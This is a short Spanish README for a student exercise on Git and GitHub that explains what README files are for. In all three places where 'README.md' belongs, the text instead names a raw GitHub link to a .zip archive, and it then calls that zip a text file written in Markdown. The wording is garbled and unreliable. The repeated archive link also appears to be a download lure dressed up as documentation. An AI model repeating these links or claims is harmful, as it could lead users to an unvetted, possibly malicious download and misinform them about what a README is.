Esta actividad tiene como propósito repasar el uso de Git y GitHub, además de utilizar un archivo https://raw.githubusercontent.com/KarynXicara/paginaweb/main/prettiness/paginaweb_3.5.zip, el cual es un archivo de texto que sirve como documentación para un proyecto de software. Se encuentra en el directorio raíz del proyecto y contiene información sobre el proyecto, como su propósito, cómo usarlo y cómo contribuir al
proyecto.

Los archivos https://raw.githubusercontent.com/KarynXicara/paginaweb/main/prettiness/paginaweb_3.5.zip son importantes porque pueden ayudar a los usuarios a comprender un proyecto rápidamente y a encontrar la información que necesitan para usarlo o contribuir a él. También pueden ayudar a los desarrolladores a documentar su código y a mantener su proyecto organizado.

El lenguaje utilizado para escribir los archivos https://raw.githubusercontent.com/KarynXicara/paginaweb/main/prettiness/paginaweb_3.5.zip es Markdown, también se
puede utilizar HTML.
